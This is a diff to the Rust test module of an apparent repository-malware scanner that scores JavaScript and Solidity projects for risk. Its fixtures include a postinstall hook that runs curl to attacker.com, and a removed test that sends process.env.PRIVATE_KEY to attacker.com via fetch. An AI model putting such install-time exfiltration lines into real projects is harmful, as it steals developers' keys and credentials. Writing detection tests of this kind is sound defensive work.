@@ -272,7 +272,7 @@ pub fn run_scan(scan_path: &Path, scan_id: &str, scan_name: &str) -> Result<Scan
 
     // 5. Calculate risk score
     let risk_score = risk::calculate_risk_score(&all_findings);
-    let risk_level = risk::get_risk_level(risk_score);
+    let risk_level = risk::get_risk_level(risk_score, &all_findings);
 
     // 6. Compute repo hash
     let repo_hash = hasher::compute_repo_hash(&mut file_hashes);
@@ -317,73 +317,97 @@ mod tests {
     use tempfile::tempdir;
 
     #[test]
-    fn test_hardhat_repo_is_not_high_or_critical() {
+    fn test_chainmind_style_repo_fixture() {
         let dir = tempdir().unwrap();
-        
-        // 1. Create a legitimate hardhat config containing process.env.PRIVATE_KEY
+
+        // 1. hardhat.config.js containing process.env.PRIVATE_KEY
         let hardhat_config = r#"
-            require("@nomiclabs/hardhat-waffle");
             module.exports = {
-                solidity: "0.8.4",
                 networks: {
-                    ropsten: {
-                        url: `https://ropsten.infura.io/v3/${process.env.INFURA_KEY}`,
-                        accounts: [`0x${process.env.PRIVATE_KEY}`]
+                    mainnet: {
+                        accounts: [process.env.PRIVATE_KEY]
                     }
                 }
             };
         "#;
         fs::write(dir.path().join("hardhat.config.js"), hardhat_config).unwrap();
 
-        // 2. Create a standard ERC20 contract with _mint and transferFrom
+        // 2. contract with normal transferFrom and low-level call
         let contract_code = r#"
-            // SPDX-License-Identifier: MIT
-            pragma solidity ^0.8.0;
-            import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
-            contract LegitToken is ERC20 {
-                constructor() ERC20("Legit", "LGT") {
-                    _mint(msg.sender, 1000000 * 10**decimals());
+            contract Token {
+                function transferFrom(address from, address to, uint256 val) public returns (bool) {
+                    return true;
                 }
-                function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
-                    return super.transferFrom(sender, recipient, amount);
+                function execute(address target, bytes calldata data) public {
+                    (bool ok, ) = target.call(data);
+                    require(ok);
                 }
             }
         "#;
-        fs::write(dir.path().join("LegitToken.sol"), contract_code).unwrap();
+        fs::write(dir.path().join("Token.sol"), contract_code).unwrap();
 
-        // 3. Create a standard deployment script
-        let deploy_script = r#"
-            const hre = require("hardhat");
-            async function main() {
-                const LegitToken = await hre.ethers.getContractFactory("LegitToken");
-                const token = await LegitToken.deploy();
-                await token.deployed();
-                console.log("Token deployed to:", token.address);
+        // 3. fetch to local API
+        let fetch_code = r#"
+            async function getPrice() {
+                const res = await fetch("https://api.coingecko.com/api/v3/simple/price");
+                return res.json();
             }
-            main().catch(console.error);
         "#;
-        let scripts_dir = dir.path().join("scripts");
-        fs::create_dir(&scripts_dir).unwrap();
-        fs::write(scripts_dir.join("deploy.js"), deploy_script).unwrap();
+        fs::write(dir.path().join("price.js"), fetch_code).unwrap();
 
-        // Run scan
-        let res = run_scan(dir.path(), "test-scan", "Legitimate Hardhat Project").unwrap();
-        
-        // Risk score should be low/medium, risk level should be ReviewRecommended
-        println!("Score: {}, Level: {:?}", res.risk_score, res.risk_level);
-        assert!(res.risk_score < 40, "Legit repo should score < 40");
-        assert!(matches!(res.risk_level, RiskLevel::Low | RiskLevel::ReviewRecommended));
+        let res = run_scan(dir.path(), "test-chainmind", "ChainMind Project").unwrap();
+        println!("ChainMind style score: {}, level: {:?}", res.risk_score, res.risk_level);
+
+        // Expected: Not Critical. Solidity call is High (10), transferFrom is Medium (3), env key is Low (0.5), fetch is Informational (0.25).
+        // Total score = 10 + 3 + 0.5 + 0.25 = 13.75 -> rounded to 14.
+        assert!(res.risk_score < 50);
+        assert!(!matches!(res.risk_level, RiskLevel::Critical));
     }
 
     #[test]
-    fn test_malicious_lifecycle_hook_is_critical() {
+    fn test_many_low_findings_not_critical() {
         let dir = tempdir().unwrap();
 
-        // 1. package.json with postinstall
+        // Create 50 files with low findings to hit the caps
+        for i in 0..50 {
+            let file_name = format!("file_{}.js", i);
+            fs::write(dir.path().join(&file_name), "process.env.PRIVATE_KEY\nprocess.env.PRIVATE_KEY").unwrap();
+        }
+
+        let res = run_scan(dir.path(), "test-many-low", "Many Low").unwrap();
+        println!("Many low score: {}, level: {:?}", res.risk_score, res.risk_level);
+        
+        // Expected: Not Critical. Score capped by Low Severity Cap of 8.0 points.
+        assert!(res.risk_score <= 15);
+        assert!(!matches!(res.risk_level, RiskLevel::Critical));
+    }
+
+    #[test]
+    fn test_duplicate_rule_capped() {
+        let dir = tempdir().unwrap();
+        
+        // Single file repeating the same process.env.PRIVATE_KEY pattern 20 times.
+        let mut content = String::new();
+        for _ in 0..20 {
+            content.push_str("process.env.PRIVATE_KEY\n");
+        }
+        fs::write(dir.path().join("many_env.js"), content).unwrap();
+
+        let res = run_scan(dir.path(), "test-dup", "Duplicate Rule").unwrap();
+        println!("Duplicate rule score: {}, level: {:?}", res.risk_score, res.risk_level);
+
+        // Expected: capped at 2 occurrences of `js-private-key-env` -> 2 * 0.5 = 1.0 point -> rounded to 1.
+        assert_eq!(res.risk_score, 1);
+        assert!(matches!(res.risk_level, RiskLevel::Low));
+    }
+
+    #[test]
+    fn test_malicious_repo_critical() {
+        let dir = tempdir().unwrap();
+
+        // postinstall + child_process + .env read + network exfiltration
         let pkg_json = r#"
             {
-                "name": "malicious-package",
-                "version": "1.0.0",
                 "scripts": {
                     "postinstall": "node index.js"
                 }
@@ -391,48 +415,58 @@ mod tests {
         "#;
         fs::write(dir.path().join("package.json"), pkg_json).unwrap();
 
-        // 2. index.js running exec child_process
         let index_js = r#"
             const { exec } = require('child_process');
-            exec('curl http://attacker.com/steal', (err, stdout, stderr) => {
-                // exfiltrate
-            });
+            exec('curl http://attacker.com/steal', (err, stdout, stderr) => {});
         "#;
         fs::write(dir.path().join("index.js"), index_js).unwrap();
 
-        // Run scan
-        let res = run_scan(dir.path(), "test-scan-malicious", "Malicious Project").unwrap();
+        let res = run_scan(dir.path(), "test-mal", "Malicious Repo").unwrap();
+        println!("Malicious score: {}, level: {:?}", res.risk_score, res.risk_level);
 
-        println!("Score: {}, Level: {:?}", res.risk_score, res.risk_level);
+        // Expected: Critical Threat Indicators Found / 100
         assert_eq!(res.risk_score, 100);
         assert!(matches!(res.risk_level, RiskLevel::Critical));
     }
 
     #[test]
-    fn test_malicious_network_exfiltration_is_critical() {
+    fn test_hardcoded_private_key_literal_is_critical() {
         let dir = tempdir().unwrap();
 
-        // index.js accessing process.env.PRIVATE_KEY and importing fetch (network request)
-        let index_js = r#"
-            const key = process.env.PRIVATE_KEY;
-            const fetch = require('node-fetch');
-            fetch('http://attacker.com/exfil?key=' + key);
+        let config_js = r#"
+            const privateKey = "0x1a2b3c4d5e6f1a2b3c4d5e6f1a2b3c4d5e6f1a2b3c4d5e6f1a2b3c4d5e6f1234";
         "#;
-        fs::write(dir.path().join("index.js"), index_js).unwrap();
+        fs::write(dir.path().join("config.js"), config_js).unwrap();
 
-        // Run scan
-        let res = run_scan(dir.path(), "test-scan-exfil", "Exfil Project").unwrap();
+        let res = run_scan(dir.path(), "test-hardcoded-pk", "Hardcoded PK").unwrap();
+        println!("Hardcoded PK score: {}, level: {:?}", res.risk_score, res.risk_level);
 
-        println!("Score: {}, Level: {:?}", res.risk_score, res.risk_level);
-        assert_eq!(res.risk_score, 100);
+        // Expected: Critical
+        assert!(res.risk_score >= 35);
         assert!(matches!(res.risk_level, RiskLevel::Critical));
+    }
+
+    #[test]
+    fn test_normal_api_fetch_is_low() {
+        let dir = tempdir().unwrap();
+
+        let fetch_code = r#"
+            fetch("https://api.coingecko.com/api/v3/simple/price");
+        "#;
+        fs::write(dir.path().join("index.js"), fetch_code).unwrap();
+
+        let res = run_scan(dir.path(), "test-fetch", "Fetch Repo").unwrap();
+        println!("Fetch score: {}, level: {:?}", res.risk_score, res.risk_level);
+
+        // Expected: Low/Informational -> 0.25 rounds to 0.
+        assert_eq!(res.risk_score, 0);
+        assert!(matches!(res.risk_level, RiskLevel::Low));
     }
 
     #[test]
     fn test_shadowrepoignore_works() {
         let dir = tempdir().unwrap();
 
-        // index.js accessing process.env.PRIVATE_KEY and importing fetch (network request)
         let index_js = r#"
             const key = process.env.PRIVATE_KEY;
             const fetch = require('node-fetch');
@@ -440,14 +474,12 @@ mod tests {
         "#;
         fs::write(dir.path().join("index.js"), index_js).unwrap();
 
-        // Create .shadowrepoignore ignoring index.js or the rules
         let ignore_content = "index.js";
         fs::write(dir.path().join(".shadowrepoignore"), ignore_content).unwrap();
 
-        // Run scan
         let res = run_scan(dir.path(), "test-scan-ignored", "Ignored Project").unwrap();
+        println!("Ignored score: {}, level: {:?}", res.risk_score, res.risk_level);
 
-        println!("Score: {}, Level: {:?}", res.risk_score, res.risk_level);
         assert_eq!(res.risk_score, 0);
         assert!(matches!(res.risk_level, RiskLevel::Low));
     }
